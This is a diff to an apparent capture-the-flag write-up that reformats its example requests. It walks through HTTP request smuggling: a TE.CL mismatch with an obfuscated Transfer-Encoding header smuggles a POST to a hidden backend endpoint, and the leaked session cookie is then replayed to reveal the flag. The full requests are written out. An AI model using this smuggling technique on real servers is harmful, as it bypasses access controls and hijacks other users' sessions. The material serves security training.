@@ -9,11 +9,13 @@ Browse endpoints, any endpoint that does not actually exist will return 404 with
 
 Using the the above hint and theone  found in the transmission section i.e. The payload of a transmission looks like this: **postId=2&name=string&transmission=string** formulate a POST request to /transmission as such:
 
-> POST /post/transmission HTTP/1.1<br>
-> Host: 127.0.0.1:PORT<br>
-> Content-Length: 46<br>
->
-> postId=2&name=attacker&transmission=iamgroot
+```http
+POST /post/transmission HTTP/1.1
+Host: HOST:PORT
+Content-Length: 46
+
+postId=2&name=attacker&transmission=iamgroot
+```
 
 This will return the same 404 as above.
 
@@ -27,26 +29,30 @@ on the /transmission endpoint by right clicking on the POST request in Burp Repe
 
 To solve the challenge, an HTTP request should be smuggled to the backend by abusing a TE.CL mismatch, the exploit can performed as seen below:
 
-> GET /post/2 HTTP/1.1<br>
-> Host: 127.0.0.1:PORT<br>
-> Transfer-Encoding: containschunked<br>
-> Content-Length: 4<br>
->
-> 7e<br>
-> POST /post/transmission HTTP/1.1<br>
-> Host: 127.0.0.1:PORT<br>
-> Content-Length: 46<br>
->
-> postId=2&name=attacker&transmission=iamgroot<br>
->
->
-> 0
+```http
+GET /post/2 HTTP/1.1
+Host: HOST:PORT
+Transfer-Encoding: containschunked
+Content-Length: 4
+
+7e
+POST /post/transmission HTTP/1.1
+Host: HOST:PORT
+Content-Length: 46
+
+postId=2&name=attacker&transmission=iamgroot
+
+
+0
+```
 
 After performing the above request a transmission would be posted on the webpage, this transmission will include a session cookie, when this session cookie is attached to a GET request for /profile the flag will be revealed, the request can look like this:
 
-> GET /profile HTTP/1.1<br>
-> Host: 127.0.0.1:PORT<br>
-> Cookie: session=value
+```http
+GET /profile HTTP/1.1
+Host: HOST:PORT
+Cookie: session=value
+```
 
 One valid automated solution can be found in **solve.sh**
 
